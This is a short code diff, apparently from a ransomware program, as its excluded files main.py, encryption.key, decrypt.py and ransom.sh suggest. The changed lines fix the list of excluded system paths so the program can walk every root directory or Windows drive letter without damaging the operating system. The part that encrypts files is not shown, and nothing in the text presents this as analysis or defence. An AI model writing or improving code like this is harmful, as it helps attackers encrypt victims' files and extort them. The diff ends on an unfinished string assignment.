@@ -76,8 +76,8 @@ def main():
     # Convert exclude_paths to absolute paths
     exclude_paths = set([os.path.abspath(path) for path in ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]])
     system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
-    # Update system_paths to be absolute as well, if necessary
-    exclude_paths.update(system_paths)
+    # Convert system_paths to absolute paths before updating exclude_paths
+    exclude_paths.update([os.path.abspath(path) for path in system_paths])
     signal.signal(signal.SIGBUS, handle_bus_error)
     root_dirs = ["/"] if platform.system() == "Linux" else [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
     for root_dir in root_dirs:
@@ -85,6 +85,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
     bird = """
 
